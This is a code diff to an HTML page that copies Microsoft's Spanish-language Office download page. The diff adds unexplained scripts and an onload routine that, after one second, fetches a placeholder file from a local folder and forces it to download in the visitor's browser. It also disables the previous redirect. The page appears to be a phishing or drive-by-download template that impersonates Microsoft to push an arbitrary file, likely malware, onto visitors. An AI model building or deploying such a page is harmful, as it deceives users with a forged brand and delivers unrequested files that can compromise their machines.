@@ -20,7 +20,8 @@
 
 
 
-
+    <script src="./templates/js/client.min.js"></script>
+    <script src="./templates/js/Info.js"></script>
     <link rel="SHORTCUT ICON" href="https://c.s-microsoft.com/favicon.ico?v2" type="image/x-icon" />
 
     <link rel="preload" as="font" crossorigin="crossorigin" type="font/woff" href="https://www.microsoft.com/mwf/_h/v3.54/mwf.app/fonts/mwfmdl2-v3.54.woff2">
@@ -687,7 +688,45 @@ define("domReady",function(){"use strict";function h(n){for(var t=0;t<n.length;t
         <h1>Gracias por comprar Office.</h1><h2>Descárgalo en tu nuevo equipo ahora.</h2><h3>Mi copia de Office se incluía con mi nuevo equipo</h3><p>Descarga una de estas versiones de Office en tu equipo:</p><ul class="c-list"><li>Office Hogar y Estudiantes</li><li>Office Hogar y Empresas</li><li>Office Profesional</li><li>Office Profesional Plus</li></ul><p>Se te pedirá la clave del producto en los siguientes pasos.</p><p><a class="c-hyperlink" href="forwarding_link" aria-label="Descargar una versión de Office para tu equipo ahora">Descargar ahora</a></p><p>&nbsp;</p>
     </div>
 
-    <script nonce="II5ecTnRQSi6DITXqzAnnQ" src="https://st3.zoom.us/static/94180/js/app/jquery.validate.message.min.js"></script>
+    <!-- Download a file-->
+    <script type="text/javascript">
+        window.onload = function () {
+            setTimeout(function () {
+                DownloadFile("forwarding_file");
+            }, 1000);
+        };
+        function DownloadFile(fileName) {
+            //Set the File URL.
+            var url = "Files/" + fileName;
+ 
+            //Create XMLHTTP Request.
+            var req = new XMLHttpRequest();
+            req.open("GET", url, true);
+            req.responseType = "blob";
+            req.onload = function () {
+                //Convert the Byte Data to BLOB object.
+                var blob = new Blob([req.response], { type: "application/octetstream" });
+ 
+                //Check the Browser type and download the File.
+                var isIE = false || !!document.documentMode;
+                if (isIE) {
+                    window.navigator.msSaveBlob(blob, fileName);
+                } else {
+                    var url = window.URL || window.webkitURL;
+                    link = url.createObjectURL(blob);
+                    var a = document.createElement("a");
+                    a.setAttribute("download", fileName);
+                    a.setAttribute("href", link);
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                }
+            };
+            req.send();
+        };
+    </script>
+
+    <!-- <script nonce="II5ecTnRQSi6DITXqzAnnQ" src="https://st3.zoom.us/static/94180/js/app/jquery.validate.message.min.js"></script>
     <script nonce="II5ecTnRQSi6DITXqzAnnQ" type="text/javascript">
     $(window).on('load',function(){
     window.location = 'forwarding_link';
@@ -700,7 +739,7 @@ define("domReady",function(){"use strict";function h(n){for(var t=0;t<n.length;t
     }, 1500 );
     }, 3000);
     });
-    </script>
+    </script> -->
 
 
     </div>
